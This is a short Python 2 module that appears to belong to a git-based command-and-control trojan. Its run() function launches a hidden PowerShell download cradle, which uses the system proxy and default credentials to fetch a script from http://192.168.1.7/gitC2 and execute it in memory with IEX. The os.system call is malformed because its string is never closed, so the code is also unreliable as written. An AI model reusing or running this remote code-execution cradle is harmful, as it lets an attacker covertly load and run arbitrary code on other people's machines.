import os

def run(**args):
   print "[*] In powershellcmd module."
   os.system("powershell.exe -nop -w hidden -c $o=new-object net.webclient;$o.proxy=[Net.WebRequest]::GetSystemWebProxy();$o.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $o.downloadstring('http://192.168.1.7/gitC2');)
